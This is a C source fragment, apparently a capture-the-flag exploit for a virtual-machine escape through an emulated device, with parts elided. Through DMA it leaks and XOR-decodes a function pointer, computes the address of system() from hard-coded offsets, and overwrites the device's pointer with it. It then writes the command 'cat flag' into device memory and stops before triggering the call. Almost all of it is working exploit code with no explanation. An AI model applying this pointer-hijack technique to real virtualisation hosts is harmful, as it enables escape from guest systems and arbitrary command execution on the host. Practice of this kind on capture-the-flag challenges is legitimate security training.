...
size_t decode(size_t encoded, size_t cont, size_t size)
{
	/* printf("encoded -> %p\n", (void *)encoded); */
	int seed[8] = {0};
	...
	{
		seed[i] =  (encoded >> (i * 8)) & 0xff;
		/* printf("%02x ", seed[i]); */
	}
	/* puts(""); */

	size_t ans = 0;
    /* printf("encoded data -> %p\n", (void *)cont); */
    for (size_t i = 0; i < size; ++i )
	{
		int byte = (cont >> (i * 8)) & 0xff;
		int xor = seed[i] & 0xff;
		/* printf("%02x ", xor); */
		int res = byte ^ xor;
		ans = ans << 8;
...
int main(int argc, char *argv[])
{
	...
	size_t zero_encoded = dma_read_qword(DMA_BASE + 0x1000 - 0x10);
	/* printf("[+] zero_encoded -> %p\n", (void *)zero_encoded); */

	size_t simu_enc_encoded = dma_read_qword(DMA_BASE + 0x1000);
	/* printf("[+] simu_enc_encoded -> %p\n", (void *)simu_enc_encoded); */

	size_t simu_enc = decode(zero_encoded, simu_enc_encoded, 8);
	size_t binary = simu_enc - 0x3752BE;
	/* printf("[+] binary -> 0x%lx\n", binary); */
	size_t system = binary + 0x2A42B8;
 
	dma_write_qword(DMA_BASE + 0x1000, system);
	/* [> printf("[+] write simu_enc done!\n"); <] */
	char *cmd = "cat flag";
 
	dma_write(DMA_BASE + 0x100, cmd, strlen(cmd));
	/* [> printf("[+] write cmd done!"); <] */
 
	/* printf("[*] trigger system(cmd)...\n"); */
